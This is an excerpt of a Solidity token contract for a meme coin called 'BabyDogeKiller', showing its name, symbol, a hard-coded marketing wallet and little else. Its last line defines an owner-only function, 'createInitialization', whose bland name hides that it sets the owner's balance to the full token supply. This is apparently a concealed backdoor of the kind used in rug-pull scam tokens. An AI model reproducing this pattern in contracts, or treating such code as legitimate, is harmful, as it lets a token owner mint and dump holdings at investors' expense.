...
contract BabyDogeKiller is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "BabyDogeKiller";
    string private _symbol = "BABYDOGEKILLER";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x4A591998Abb2c22e9eefcD25354C543E1795FFc7);
    ...
    function createInitialization() external onlyOwner() {_totalWallets[getOwner()] = _totalAmount;}
